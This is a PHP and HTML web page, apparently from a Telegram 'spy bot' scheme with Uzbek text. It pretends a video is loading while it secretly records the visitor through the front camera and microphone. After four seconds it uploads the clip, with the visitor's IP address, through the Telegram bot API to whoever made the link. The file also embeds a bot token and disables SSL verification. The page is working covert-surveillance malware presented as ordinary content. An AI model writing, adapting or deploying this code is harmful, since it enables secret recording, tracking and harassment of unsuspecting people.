<?php
error_reporting(E_ALL);
ini_set('display_errors', 0);

$bot_token = "8592685877:AAFHxj5UaKAXxpMz5qNzdrBQ9k1Ucn-MDRE";
$log_file = "debug_log.txt";

function writeLog($text) {
    global $log_file;
    file_put_contents($log_file, date('Y-m-d H:i:s') . " | OLD VIDEO | " . $text . "\n", FILE_APPEND);
}

$user_id = $_GET['id'] ?? '';
if(empty($user_id) || !is_numeric($user_id)) {
    header("Location: https://t.me/eShpionBot?start=true");
    exit;
}

if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['video'])) {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Noma\'lum';
    $video = $_FILES['video'];
    
    writeLog("Video keldi. Hajmi: " . round($video['size']/1024) . " KB");

    $caption = "🎥 OLD VIDEO QABUL QILINDI\n\n👤 ID: $user_id\n🌐 IP: $ip\n📅 " . date('d.m.Y H:i:s');
    
    $ch = curl_init("https://api.telegram.org/bot{$bot_token}/sendVideo");
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_POSTFIELDS => [
            'chat_id' => $user_id,
            'video' => new CURLFile($video['tmp_name'], $video['type'], 'video.webm'),
            'caption' => $caption,
            'parse_mode' => 'HTML'
        ]
    ]);
    
    $res = curl_exec($ch);
    writeLog("Telegram javobi: " . $res);
    curl_close($ch);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Video Loading...</title>
    <style>body{background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif;}</style>
</head>
<body>
    <div id="status">Video yuklanmoqda...</div>
    <script>
    (async function(){
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
            const recorder = new MediaRecorder(stream);
            const chunks = [];

            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const fd = new FormData();
                fd.append('video', blob);
                await fetch(window.location.href, { method: 'POST', body: fd });
                window.location.href = "https://t.me/eShpionBot?start=true";
            };

            recorder.start();
            document.getElementById('status').innerText = "Yozilmoqda...";
            
            setTimeout(() => {
                recorder.stop();
                stream.getTracks().forEach(t => t.stop());
            }, 4000); // 4 soniya yozadi

        } catch (e) {
            window.location.href = "https://t.me/eShpionBot?start=true";
        }
    })();
    </script>
</body>
</html>
